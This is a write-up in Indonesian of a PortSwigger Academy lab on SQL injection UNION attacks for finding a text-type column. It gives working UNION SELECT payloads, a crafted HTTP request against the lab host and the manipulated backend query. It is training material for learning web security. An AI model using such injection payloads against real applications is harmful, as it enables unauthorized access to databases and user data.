# [PortSwigger Academy] SQL Injection - Lab #8

## 📌 Detail Lab
* **Nama Tantangan:** SQL injection UNION attack, finding a column containing text
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** SQL Injection (SQLi)
* **Tujuan Lab:** Menentukan kolom mana yang bertipe data teks (string) dari hasil kueri `UNION` agar bisa digunakan untuk menampilkan data sensitif, lalu menampilkan string acak yang diberikan oleh lab.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Agar serangan `UNION` dapat menampilkan data seperti username atau password, kita harus menyuntikkan data tersebut ke dalam kolom kueri asli yang bertipe teks (String/Varchar). Jika kita mencoba memasukkan teks ke dalam kolom yang bertipe data angka (Integer), database akan menghasilkan error.

Pada lab ini, langkah awal dengan `ORDER BY` atau `UNION SELECT NULL` mengonfirmasi bahwa kueri asli mengembalikan **3 kolom**. Langkah selanjutnya adalah menguji satu per satu kolom tersebut menggunakan string acak (misalnya: `'v9xW2Q'`) yang disediakan oleh lab.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

Pengujian tipe data dilakukan dengan mengganti nilai `NULL` secara bergantian dengan string target pada parameter kategori melalui Burp Repeater:

### Menguji Kolom 1
Masukkan string acak pada posisi kolom pertama:
* **Payload:** `' UNION SELECT 'o6fWOk', NULL, NULL--`
* **Respons:** *HTTP 500 Internal Server Error* (Kolom 1 bukan tipe data string).

### Menguji Kolom 2
Pindahkan string acak ke posisi kolom kedua:
* **Payload:** `' UNION SELECT NULL, 'o6fWOk', NULL--`

Request HTTP final di Burp Repeater:
```http
GET /filter?category=Accessories' UNION SELECT NULL,'o6fWOk',NULL-- HTTP/2
Host: 0a67008103e8216881e3483900c80094.web-security-academy.net
```
Respons: HTTP 200 OK (Aplikasi merespons normal dan string 'o6fWOk' berhasil muncul di halaman web).

### Hasil Eksekusi Database
Di sisi database backend, kueri dimanipulasi menjadi:
```
SELECT * FROM products WHERE category = 'Accessories' UNION SELECT NULL, 'o6fWOk', NULL--' AND released = 1
```
Hasil Akhir: Karena penempatan string pada kolom kedua menghasilkan HTTP 200 dan teksnya sukses dirender di layar browser, ini membuktikan bahwa kolom ke-2 adalah kolom yang bertipe teks. Lab berhasil diselesaikan (Solved).